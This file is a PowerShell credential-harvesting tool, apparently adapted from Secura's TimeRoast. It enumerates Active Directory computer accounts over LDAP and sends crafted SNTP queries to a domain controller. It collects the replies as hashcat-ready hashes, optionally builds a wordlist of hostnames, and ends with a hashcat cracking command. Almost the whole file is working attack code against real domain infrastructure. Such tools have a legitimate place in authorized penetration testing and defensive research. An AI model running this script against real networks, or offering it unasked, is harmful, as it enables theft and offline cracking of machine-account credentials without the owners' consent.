<#

Slightly altered version of the TimeRoast PowerShell script originally published by Secura:
https://github.com/SecuraBV/Timeroast

This script performs SNTP-based time roasting against a Domain Controller (DC),
targeting computer accounts via their RIDs and resolving those RIDs to hostnames
using LDAP enumeration. The output includes hashes in a format compatible with Hashcat
(`$sntp-ms$`) and includes the associated computer hostname for easier identification.

The beta version of hashcat is required for mode 31300: https://hashcat.net/beta

This tool must be executed from a host authenticated to the domain (e.g., via a domain user),
and requires LDAP access to enumerate computer account objects.

Modifications from the original:
- LDAP is used to resolve computer account names and extract RIDs.
- Output format includes the resolved hostname instead of just the RID.
- Added optional wordlist generation of sAMAccountNames (lowercased, no trailing '$').

. USAGE
Invoke-AuthenticatedTimeRoast -DomainController "dc01.security.local"

. USAGE
Invoke-AuthenticatedTimeRoast -DomainController "dc01.security.local" -OutputFile hashes.log -GenerateWordlist

. USAGE
Invoke-AuthenticatedTimeRoast -DomainController "dc01.security.local" -GenerateWordlist

. NOTE
Requires the beta version of hashcat for cracking with -m 31300: https://hashcat.net/beta

. NOTE
hashcat.exe -m 31300 -a 0 -O Hashes\hash.txt Wordlists\rockyou.txt -r rules\best64.rule --username

#>


Function Invoke-AuthenticatedTimeRoast {

    param(
        [Parameter(Mandatory = $true)]
        [string]$DomainController,

        [string]$OutputFile,
        [int]$Rate = 180,
        [int]$Timeout = 24,
        [Uint16]$SourcePort,

        [switch]$GenerateWordlist
    )

    ""

    $ErrorActionPreference = "Stop"
    $NtpPrefix = [byte[]]@(0xdb, 0x00, 0x11, 0xe9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xe1, 0xb8, 0x40, 0x7d, 0xeb, 0xc7, 0xe5, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xe1, 0xb8, 0x42, 0x8b, 0xff, 0xbf, 0xcd, 0x0a)

    if ($OutputFile) { Out-Null > $OutputFile }

    if ($SourcePort) { $Client = New-Object System.Net.Sockets.UdpClient($SourcePort)}
    else { $Client = New-Object System.Net.Sockets.UdpClient }

    $Client.Client.ReceiveTimeout = [Math]::Floor(1000 / $Rate)
    $Client.Connect($DomainController, 123)

    function Get-ComputerRids {
        param([string]$DomainController)

        $Searcher = New-Object System.DirectoryServices.DirectorySearcher
        $Searcher.SearchRoot = "LDAP://$DomainController"
        $Searcher.Filter = "(&(objectCategory=computer))"
        $Searcher.PageSize = 1000
        $Searcher.PropertiesToLoad.AddRange(@("sAMAccountName", "objectSID"))

        $Computers = @()
        foreach ($Result in $Searcher.FindAll()) {

            try {

                $SamAccountName = $Result.Properties["sAMAccountName"][0]
                $Sid = New-Object System.Security.Principal.SecurityIdentifier($Result.Properties["objectsid"][0], 0)
                $Rid = [int]$Sid.Value.Split("-")[-1]

                $Computers += [PSCustomObject]@{
                    Name = $SamAccountName
                    RID  = $Rid
                }
            }

            catch { continue }
        }

        return $Computers
    }

    $Computers = Get-ComputerRids -DomainController $DomainController
    $TimeoutTime = (Get-Date).AddSeconds($Timeout)

    if ($GenerateWordlist) {
        $WordlistPath = "wordlist.txt"
        foreach ($Computer in $Computers) {

            $Name = $Computer.Name.TrimEnd('$').ToLower()
            $Name | Out-File -Append -FilePath $WordlistPath -Encoding "ascii"

        }

        Write-Output "[*] Wordlist written to $PWD\$WordlistPath"
    }

    foreach ($Computer in $Computers) {
        $Rid = $Computer.RID
        $Query = $NtpPrefix + [BitConverter]::GetBytes($Rid) + [byte[]]::new(16)

        [void] $Client.Send($Query, $Query.Length)

        try {
            $Reply = $Client.Receive([ref]$null)

            if ($Reply.Length -eq 68) {

                $Salt = [byte[]]$Reply[0..47]
                $Md5Hash = [byte[]]$Reply[-16..-1]
                $AnswerRid = [BitConverter]::ToUInt32($Reply[-20..-16], 0)

                $HexSalt = [BitConverter]::ToString($Salt).Replace("-", "").ToLower()
                $HexHash = [BitConverter]::ToString($Md5Hash).Replace("-", "").ToLower()

                $ComputerHostname = $Computer.Name.TrimEnd('$')
                $HashcatHash = "$ComputerHostname`:`$sntp-ms`${0}`${1}" -f $HexHash, $HexSalt

                if ($OutputFile) { $HashcatHash | Tee-Object -Append -FilePath $OutputFile }
                else { Write-Output $HashcatHash }

                $TimeoutTime = (Get-Date).AddSeconds($Timeout)
            }
        }

        catch { continue }
    }

    if ($OutputFile){ Write-Output "`n[*] Hashes written to $PWD\$OutputFile" }
    $Client.Close()
}
